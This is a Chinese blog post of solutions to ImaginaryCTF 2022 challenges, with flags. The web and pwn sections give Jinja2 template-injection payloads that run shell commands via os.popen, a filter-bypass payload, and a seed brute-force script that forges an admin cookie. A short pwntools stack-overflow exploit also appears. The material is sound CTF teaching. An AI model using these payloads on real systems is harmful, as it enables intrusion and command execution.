---
title: ImaginaryCTF 2022
date: 2022-07-19 12:36:39
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image.png](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191106531.png?x-oss-process=hzy)

<!--more-->

----------------------------------------------

# 前言

这个比赛题量给到位，而且都算是可以接受的题目，考的内容涵盖也很多，非常值得学习一下，当然，我比赛过程中没出几道，菜鸡继续学习~~~

# misc

## **Discord**

> Join our Discord community for updates and support! If you would like to do some more CTF after this competition, we do host daily CTF challenges on our Discord server as well. Join at https://discord.gg/ctf . You can find the flag for this challenge in the channel .`#imaginaryctf-2022`

签到题，进去就给flag

ictf{stay_tuned_after_the_ctf_for_daily_ctf_challenges!}

## Sanity Check

Welcome to ImaginaryCTF 2022! All flags are written in flag format unless otherwise stated. Have fun and enjoy the challenges!`ictf{s0m3_1337_f1ag}`

![image-20220717191955841](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171919906.png?x-oss-process=hzy)

ictf{w3lc0m3_t0_1m@g1nary_c7f_2022!}

## Sponsors

> The ImaginaryCTF team would like to thank DigitalOcean, Google Cloud, and Trail of Bits for sponsoring this CTF!
>
> Learn more about our sponsors at the links below:
>
> - Trail of Bits: https://www.trailofbits.com/
> - DigitalOcean: https://youtu.be/xw5UBDZMOIA
> - Google Cloud: https://cloud.google.com/
>
> One of them might contain a flag... 👀

在youtube里看到了flag

![image-20220717192542923](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207171925088.png?x-oss-process=hzy)

ictf{digitalocean_r0cks!}

# web

## Democracy

> **Description**
>
> This challenge has been shut down. The flag is .`ictf{i'm_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...}`
>
> I'm tired of all these skill-based CTF challenges. Y'know what we need more of here? Politics! Simply convince (or strongarm) your fellow competitors to vote for you. The top 1% of players who have the most votes (or top 50, whichever is less) will recieve the flag. This voting will occur 5 times per hour. Keep in mind that no matter how many accounts you make, you can only vote once per IP. Good luck, and happy campaigning!

ictf{i'm_sure_you_0btained_this_flag_with0ut_any_sort_of_trickery...}

## SSTI Golf 

> Just in case you didn't get *enough* golf with the other challenge. Flag is in an arbitrarily named file, but in the same directory.

就是考察对SSTI的基础认知

进地址f12得到一段代码

```

#!/usr/bin/env python3

from flask import Flask, render_template_string, request, Response

app = Flask(__name__)

@app.route('/')   // 根目录路由
def index():
    return Response(open(__file__).read(), mimetype='text/plain')

@app.route('/ssti')   ssti路由
def ssti():
    query = request.args['query'] if 'query' in request.args else '...'   请求query
    if len(query) > 48:   //限制长度要小于48
        return "Too long!"
    return render_template_string(query)

app.run('0.0.0.0', 1337)
```

可以看到并没有过滤什么，先来个运算看看会不会执行

![image-20220717202843182](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172028243.png?x-oss-process=hzy)

### 法一

查看配置，全局搜索得到flag

![image-20220717203025645](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172030778.png?x-oss-process=hzy)

### 法二

```
{{cycler.next.__globals__.os.popen('nl *')|max}}
```

![image-20220719104410342](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191044409.png?x-oss-process=hzy)

### 法三

```
{{lipsum.__globals__.os.popen('cat *').read()}}
```

![image-20220719104446281](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191044352.png?x-oss-process=hzy)

ictf{F!1+3r5s!?}

## minigolf

> Too much Flask last year... let's bring it back again.

查看源代码内容如下

```

from flask import Flask, render_template_string, request, Response
import html

app = Flask(__name__)

blacklist = ["{{", "}}", "[", "]", "_"]       // 黑名单过滤

@app.route('/', methods=['GET'])  //传参方式
def home(): 
  print(request.args)
  if "txt" in request.args.keys():
    txt = html.escape(request.args["txt"])
    if any([n in txt for n in blacklist]):
      return "Not allowed."  // 触发黑名单
    if len(txt) <= 69:        // 长度限制
      return render_template_string(txt)
    else:
      return "Too long."
  return Response(open(__file__).read(), mimetype='text/plain')   // 返回这个值应该就是目标，也就是flag

app.run('0.0.0.0', 1337)
```

本来考虑的是flask的ssti漏洞，黑名单里有{}，[],还有_，，基本断定就是这个漏洞，只是需要绕过，所以这样直接传的话肯定会被拦截

![image-20220717203957420](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207172039471.png?x-oss-process=hzy)

![image-20220719143958098](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191439191.png?x-oss-process=hzy)

![image-20220718001056918](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207180010041.png?x-oss-process=hzy)

后边考虑这个玩意，但是绕过之后发现长度太长，不行

```
().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('cat /fl4g|base64').read()

().\x5f\x5class\x5f\x5.\x5f\x5bases\x5f\x5[0].\x5f\x5subclasses\x5f\x5()[177].\x5f\x5init\x5f\x5.\x5f\x5globals\x5f\x5.\x5f\x5builtins\x5f\x5['open']('cat /fl4g|base64').read()
```

首先先验证一下能不能用\x5f代替下划线吧,发现不行

重新捋一下思路，既然可以读取配置文件，那我们不妨读取config.a查看配置

```
{%print(config.a)%}       //全局变量
```

![image-20220719114917571](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191149637.png?x-oss-process=hzy)

读取flag

```
{%print(lipsum|attr(config.a)).os.popen(config.g).read()%}
```

![image-20220719115257822](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191152888.png?x-oss-process=hzy)

ictf{whats_in_the_flask_tho}

## rooCookie

> Roo seems to have left his computer on, can you find his password?

![image-20220719101718858](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191017962.png?x-oss-process=hzy)

查看cookie，说的是把密码放到了cookie里面

![image-20220719101824753](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191018821.png?x-oss-process=hzy)

token中是一堆二进制，但是尝试直接解密不行，应该是有自己的加密算法

看源码得到加密算法

```
function createToken(text) {
	let encrypted = "";
  for (let i = 0; i < text.length; i++) {    //  明文for循环进行加密
		encrypted += ((text[i].charCodeAt(0)-43+1337) >> 0).toString(2)    // tostring方法最终转换二进制   charCodeAt方法是返回unicode编码
  }
  document.cookie = encrypted
}
```

在算法那一行有一个假象就是按位运算，但是>>0所以位是不变的

逆向一下，首先按照11个字符长度为一组分组，二进制转十进制，再-1337+43

脚本如下

```
token = "101100000111011000000110101110011101100000001010111110010101101111101011110111010111001110101001011101001100001011000000010101111101101011111011010011000010100101110101001101001010010111010101111110101011011111011000000110110000001101100001011010111110110110000000101011100101010100101110100110000101011101111010111000110110000010101011101001011000100110101110110101001111101010111111010101000001101011011011010100010110101110110101011011111010100010110101101101101100001011010110111110101000011101011111001010100010110101101101101100000101010011111010100111110101011011011010111000010101000010101011100101011000101110100110000"

for i in range(len(token) // 11):
    tmp = "0b" + token[i*11:i*11+11]
    print(chr(int(tmp,2)-1337+43), end="")
print("")

// username="roo" & password="ictf{h0p3_7ha7_wa5n7_t00_b4d}"
```

ictf{h0p3_7ha7_wa5n7_t00_b4d}

> 疑问： 在这道题刚开始我是有个疑问的，就是为什么要是11个长度为一组？
>
> 答：ASCII字符最多只能达到8位，但是1337是十一位，所以改大小必须是最大大小，也就是11个长度为一组  //  1337--->10100111001
>
> 引用外国友人的一句话，就是这么个道理
>
> with 1 bit (wich is either 0 or 1 ) you have a total of 2 possibles values, for 2 bits (00,01,10,11) you have 4 possibilites and so on .... for n bits you have 2^n possibles values, if we fit into 8 bits we have only 256 possible values so 1294(wich is added to all char value)  don't fit into it and need extra bits 

## button

> Apparently one of these buttons isn't useless...

起初看到描述我知道肯定有一个标签是出众的

![image-20220719112304352](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191123409.png?x-oss-process=hzy)

![image-20220719112241783](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191122857.png?x-oss-process=hzy)

![image-20220719112320005](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191123054.png?x-oss-process=hzy)

通过推理，我认为flag应该是ictf{y0u_f0und_7h3_f1ag},但是交了不对，不知道该从何下手了

这个时候看到好多标签都是notSusFunction，只有一个是motSusFunction，然后点那个点，就可以出来flag了，该说不说，这题有点狗

没有颜色的点，所以要多试几次，或者给标签加个颜色

![image-20220719112928279](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191129346.png?x-oss-process=hzy)

ictf{y0u_f0und_7h3_f1ag!}

## maas

> Cookie Stream is back, with a new auth system and something way more useful than rickrolling people.

![image-20220719130402655](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191304838.png?x-oss-process=hzy)

代码审计，直接贴出来关键代码app.py

```
from flask import Flask, render_template, request, make_response, redirect
from hashlib import sha256
import time
import uuid
import random

app = Flask(__name__)

memes = [l.strip() for l in open("memes.txt").readlines()]
users = {}
taken = []

def adduser(username):
  if username in taken:
    return "username taken", "username taken"
  password = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])
  cookie = sha256(password.encode()).hexdigest()
  users[cookie] = {"username": username, "id": str(uuid.uuid1())}
  taken.append(username)
  return cookie, password

@app.route('/')
def index():
    return redirect("/login")

@app.route('/users')
def listusers():
  return render_template('users.html', users=users)

@app.route('/users/<id>')
def getuser(id):
  for k in users.keys():
    if users[k]["id"] == id:
      return f"Under construction.<br><br>User {users[k]['username']} is a very cool user!"

@app.route('/login', methods=['GET', 'POST'])
def login():
  if request.method == "POST":
    resp = make_response(redirect('/home'))
    cookie = sha256(request.form["password"].encode()).hexdigest()
    resp.set_cookie('auth', cookie)
    return resp
  else:
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
  if request.method == "POST":
    cookie, password = adduser(request.form["username"])
    resp = make_response(f"Username: {request.form['username']}<br>Password: {password}")
    resp.set_cookie('auth', cookie)
    return f"Username: {request.form['username']}<br>Password: {password}"
  else:
    return render_template('register.html')

@app.route('/home', methods=['GET'])
def home():
    cookie = request.cookies.get('auth')
    username = users[cookie]["username"]
    if username == 'admin':
        flag = open('flag.txt').read()
        return render_template('home.html', username=username, message=f'Your flag: {flag}', meme=random.choice(memes))
    else:
        return render_template('home.html', username=username, message='Only the admin user can view the flag.', meme=random.choice(memes))

@app.errorhandler(Exception)
def handle_error(e):
    return redirect('/login')

def initialize():
  random.seed(round(time.time(), 2))
  adduser("admin")

initialize()
app.run('0.0.0.0', 8080)
```

分析一下不难看出，这是个通过cookie来登录用户的系统，利用cookie进行身份验证。同时在初始化函数时根据当前时间随机生成一个数值，并创建admin用户。

![image-20220719131358676](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191313772.png?x-oss-process=hzy)

/register在这个路由下，实现的注册功能，当输入一个username时就会跳转到adduser(),去执行那个方法，先是检测有无重复的ID，没有的话就会创建密码并返回，然后输入的username时通过uuid进行创建并随机生成一个三十位字符的密码，采用哈希加密，当作cookie

![image-20220719131412951](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191314009.png?x-oss-process=hzy)

接着再看/login这个路由，实现登录功能，从/home这个路由中获取auth的cookie值，然后if判断，时admin还是不是admin，是的话就会返回flag

![image-20220719131423776](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191314859.png?x-oss-process=hzy)



大致思路就是这样，所以现在首先需要获取admin当时生成的那个值（当时的那个随机数），这个时候看这个

```
users[cookie] = {"username": username, "id": str(uuid.uuid1())}
```

![image-20220719131924336](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191319392.png?x-oss-process=hzy)

所以只需要找到admin的id，就可以推出来时间，id看这里

![image-20220719132022757](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191320805.png?x-oss-process=hzy)

访问/users

![image-20220719132104952](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191321025.png?x-oss-process=hzy)

![image-20220719132112718](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191321783.png?x-oss-process=hzy)

即得到admin的id

```
2934212e-06a9-11ed-8455-6aa3d9e8413d
```

然后使用UUID解码器https://createuuid.com/ko/decoder/

![image-20220719132330304](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191323406.png?x-oss-process=hzy)

得到时间是(这就是创建admin时的时间)

```
2022. 7. 18. 10:51:52 PM
```

通过时间来得到那个随机值https://www.unixtimestamp.com/

![image-20220719132450301](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191324409.png?x-oss-process=hzy)



所以 1658155912就是那个生成admin时的随机值，但是到这还没有结束，因为他对随机值进行了小数点保留两位的限制，并不是整数，当然，我们可以一个一个试，但是太麻烦，写个脚本跑一下

```
import requests, time
import random
from hashlib import sha256

i = 1658155912.00  //  从整开始
for j in range(100000):
    random.seed(round(i, 2))
    password = "".join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(30)])
    cookie = sha256(password.encode()).hexdigest()

    URL = "http://maas.chal.imaginaryctf.org/home"
    header = {"cookie" : f"auth = {cookie}"}   // 创建一个cookie，登录
    res = requests.get(URL, headers=header)

    if "ictf" in res.text:   // 如果包含ictf，就会输出text文件，也就是flag
        print(res.text)
        break
    else:
        print(header)  // 不是的话就输出cookie头
        i += 0.01   // i一次加0.01，一直循环直到出flag
```

![image-20220719134822145](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191348231.png?x-oss-process=hzy)

ictf{d0nt_use_uuid1_and_please_generate_passw0rds_securely_192bfa4d}

# pwn

## ret2win

> Jumping around in memory is hard. I'll give you some help so that you can pwn this!

第一次做pwn题，接触一下吧

首先附件当然是拉到ida打开，反编译看一下

![image-20220719140744247](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191407329.png?x-oss-process=hzy)

附件中直接给了C语言的源代码，算是降低难度了

```
#include <stdio.h>
#include <stdlib.h>

int win() {
  FILE *fp;
  char flag[255];
  fp = fopen("flag.txt", "r");
  fgets(flag, 255, fp);
  puts(flag);
}

char **return_address;

int main() {
  char buf[16];
  return_address = buf+24;

  setvbuf(stdout,NULL,2,0);
  setvbuf(stdin,NULL,2,0);

  puts("Welcome to ret2win!");
  puts("Right now I'm going to read in input.");
  puts("Can you overwrite the return address?");

  gets(buf);

  printf("Returning to %p...\n", *return_address);
}
```

暂且不先看伪代码，先看C语言的源代码，不难发现，在主函数中调用了get函数，最终我们的目的也肯定是执行win函数，然后才能输出flag，现在回到伪代码，可以看到那个gets函数。

查一下保护机制

![image-20220719141409412](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191414484.png?x-oss-process=hzy)

栈溢出问题，用 win()的加法器溢出返回地址,exp如下

```
from pwn import *

context.binary = elf = ELF("./vuln")
#conn = elf.process()
conn = remote("ret2win.chal.imaginaryctf.org", 1337)

conn.sendline(b"a"*24 + p64(elf.sym.win))
conn.interactive()
```

![image-20220719141541884](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207191415942.png?x-oss-process=hzy)

ictf{c0ngrats_on_pwn_number_1_9b1e2f30}

